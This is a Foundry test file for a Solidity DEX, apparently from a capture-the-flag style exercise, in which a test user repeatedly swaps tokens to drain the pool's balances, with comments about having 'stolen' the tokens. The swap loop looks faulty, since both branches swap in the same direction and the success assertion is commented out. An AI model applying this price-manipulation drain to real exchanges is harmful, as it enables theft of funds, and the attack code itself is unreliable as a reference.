// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "../src/Swap.sol";



contract DexTest is Test {
    Dex dex;
    SwappableToken token1;
    SwappableToken token2;
    // DexAttacker attackerContract;
    address owner = address(1);
    address Naruto = address(2);

    function setUp() public {
        vm.startPrank(owner);
        dex = new Dex();
        vm.stopPrank();

        // vm.startPrank(Naruto);
        // // attackerContract = new DexAttacker(address(dex));
        //   vm.stopPrank();

          vm.startPrank(owner);
        token1 = new SwappableToken(address(dex), "Token1", "TK1", 1000);
        token2 = new SwappableToken(address(dex), "Token2", "TK2", 1000);
        dex.setTokens(address(token1), address(token2));
        token1.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        token2.approve(address(dex), 100);
        dex.addLiquidity(address(token2), 100);

        token1.transfer(address(Naruto), 10);
        token2.transfer(address(Naruto), 10);

        vm.stopPrank();
    }

//     function test_Attack() public{

//         vm.startPrank(Naruto);
//         token1.approve(address(dex), type(uint256).max);
//         token2.approve(address(dex), type(uint256).max);
       

//  uint finalToken1Bal = token1.balanceOf(Naruto);
//         uint finalToken2Bal = token2.balanceOf(Naruto);
//         uint dexFinalToken1Bal = dex.balanceOf(address(token1), address(dex));
//         uint dexFinalToken2Bal = dex.balanceOf(address(token2), address(dex));
//         console.log("attackerContractBal", dex.balanceOf(address(token1),(address(attackerContract))));
//         console.log("Final Naruto Token1 Balance: ", finalToken1Bal);
//         console.log("Final Naruto Token2 Balance: ", finalToken2Bal);
//         console.log("Final DEX Token1 Balance: ", dexFinalToken1Bal);
//         console.log("Final DEX Token2 Balance: ", dexFinalToken2Bal);
//         // attackerContract.attack();
//          // Assert that Naruto has successfully stolen all of Token A
//         // assertEq(dexFinalToken1Bal, 0);

//         vm.stopPrank();
        
//     }

    function testAttack() public {
        // vm.startPrank(owner);
        // token1.approve(address(dex), 100);
        // dex.addLiquidity(address(token1), 100);
        // token2.approve(address(dex), 100);
        // dex.addLiquidity(address(token2), 100);
        // vm.stopPrank();

        vm.startPrank(Naruto);
        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        uint256 attackAmount = 10;

        while (true) {
            uint dexToken1Balance = dex.balanceOf(address(token1), Naruto);
            uint dexToken2Balance = dex.balanceOf(address(token2), Naruto);

         uint256 dexToken1 = token1.balanceOf(Naruto);
            uint256 dexToken2 = token2.balanceOf(address(dex));
            if (dexToken1 == 0 || dexToken2 == 0) break;

            // Determine which token to swap
            if (dexToken1Balance > 0) {
                // Swap token1 to token2
                uint256 swapAmount = dexToken1Balance;
                dex.swap(address(token2), address(token1), swapAmount);
            } else if (dexToken2Balance > 0) {
                // Swap token2 to token1
                uint256 swapAmount = dexToken2Balance;
                dex.swap(address(token2), address(token1), swapAmount);
            } else {
                break; // No tokens left to swap
            }
        }

        // Final Balances
        uint finalToken1Bal = token1.balanceOf(Naruto);
        uint finalToken2Bal = token2.balanceOf(Naruto);
        uint dexFinalToken1Bal = dex.balanceOf(address(token1), address(dex));
        uint dexFinalToken2Bal = dex.balanceOf(address(token2), address(dex));

        console.log("Final Naruto Token1 Balance: ", finalToken1Bal);
        console.log("Final Naruto Token2 Balance: ", finalToken2Bal);
        console.log("Final DEX Token1 Balance: ", dexFinalToken1Bal);
        console.log("Final DEX Token2 Balance: ", dexFinalToken2Bal);

        // Assert that Naruto has successfully stolen all of Token A
        // assertEq(dexFinalToken1Bal, 0);
    }
}
